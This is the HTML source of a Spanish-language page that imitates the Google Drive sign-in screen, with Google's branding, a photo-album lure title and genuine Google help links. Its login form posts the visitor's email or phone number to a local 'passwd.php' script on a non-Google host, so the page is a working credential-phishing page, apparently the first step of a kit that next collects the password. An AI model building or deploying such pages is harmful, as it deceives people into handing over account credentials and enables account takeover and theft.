<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<!--<link rel="canonical" href="https://drive.nasneas.com/index.php">-->
	<meta property="og:site_name" content="drive.google.com">
	<meta property="og:title" content="Album fotos Friday's (2021-22)" />
	<meta property="og:description" content="Google Drive es una herramienta gratuita basada en Web para crear, subir y compartir documentos online con la posibilidad de colaborar en grupo. Google Drive permite: Crear, editar y subir documentos." />
	<meta property="og:image" itemprop="image" content="./images/drivelogo.png">
	<meta property="og:type" content="website" />
	<meta name="viewport" content="width=device-width, user-scalable=no">
	<link rel="icon" type="image/x-icon" href="./images/googlecircular.png">
	<link rel="stylesheet" type="text/css" href="./css/index-styles.css">
	<title>Google Drive: inicio de sesión</title>
</head>
<body onload="myFunction()">
	<center>
		<div id="login">
			<div id="loader">
				<div id="loader-insd"></div>
			</div>
			<img src="./images/entirelogo.png" alt="logo" width="75" height="25">
			<h1>Iniciar sesión</h1>
			<h3>Ir a Google Drive</h3>
			<form target="_self" method="post" action="./passwd.php"> 
				<div id="invisible">Correo electrónico o teléfono</div>
            	<input id="inputusername" onclick="document.getElementById('invisible').style.display='block'" type="text" placeholder="Correo electrónico o teléfono" name="email" required> 
			<a class="forgotten" href="https://accounts.google.com/security">¿Has olvidado tu correo electrónico?</a>
			<br>
			<p class="nopc">¿No es tu ordenador? Usa una ventana privada para iniciar sesión. <a class="nopclink" href="https://support.google.com/accounts/answer/2917834?visit_id=637794134369769555-1053720231&p=signin_privatebrowsing&hl=es&rd=1">Más información</a></p>
			<div class="divaccount">
			<a class="createaccount" href="https://accounts.google.com/signup/v2/webcreateaccount?service=wise&continue=http%3A%2F%2Fdrive.google.com%2F%3Futm_source%3Den&ltmpl=drive&dsh=S1879578602%3A1643818208275050&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp">Crear cuenta</a>
            <a href="./passwd.php"><input class="continue" type="submit" name="Siguiente" value="Siguiente" accesskey="enter"></a></form>
			</div>
		</div>
		<div id="mediadiv"><p class="pleft">Español (España)<img class="arrow" src="./images/blackarrow.png" width="10" height="10" alt="arrow"></p><p class="pright"><a class="linksright" href="https://support.google.com/accounts?hl=es#topic=3382296">Ayuda </a><a class="linksright spacingleft" href="https://policies.google.com/privacy?gl=ES&hl=es">Privacidad </a><a class="linksright spacingleft" href="https://policies.google.com/terms?gl=ES&hl=es">Términos</a></p></div>
	</center>
	<script>
		var myVar;
		
		function myFunction() {
		  myVar = true;
		  do{
		  	document.getElementById("loader").style.opacity = "100%";
		  	document.getElementById("login").style.opacity= "45%";
		  	myVar = false
		  }while(myVar == true);
		  myVar = setTimeout(showPage, 900);
		}

		function showPage() {
		  document.getElementById("login").style.opacity= "100%";
		  document.getElementById("loader").style.display = "none";
		  document.getElementById("myDiv").style.display = "block";
		}
		
	</script>

</body>
</html>